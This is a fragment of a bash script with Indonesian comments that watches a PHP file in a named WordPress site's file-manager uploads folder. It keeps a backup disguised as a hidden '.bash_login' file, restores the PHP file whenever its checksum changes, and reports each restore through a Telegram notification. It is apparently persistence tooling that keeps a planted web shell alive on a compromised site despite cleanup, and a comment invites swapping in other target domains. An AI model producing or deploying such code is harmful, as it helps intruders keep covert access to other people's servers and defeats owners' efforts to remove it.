...
INDEX_FILE=/home/www/narcotiquesanonymes.org/v2/wp-content/uploads/wp-file-manager-pro/templates/data.php"
# Definisikan lokasi folder backup Permissions 755
BACKUP_FOLDER="/home/www/narcotiquesanonymes.org/v2/wp-content/uploads/wp-file-manager-pro/"
# Buat folder backup jika belum ada
mkdir -p "$BACKUP_FOLDER"
# Tentukan nama file backup Permissions 755
BACKUP_FILE="$BACKUP_FOLDER/.bash_login"
...
monitor_file() {
    while true; do
        ...
        if [ "$CURRENT_CHECKSUM" != "$BACKUP_CHECKSUM" ]; then
            ...
            echo "https://narcotiquesanonymes.org/."
            send_telegram_notification "/home/www/narcotiquesanonymes.org/v2/wp-content/uploads/wp-file-manager-pro/templates. Folder Di kembalikan." # UBAH JADI NAMA FILE/DOMAIN. UBAH JADI NAMA FILE/DOMAIN YG DI KEMBALIKAN
        fi
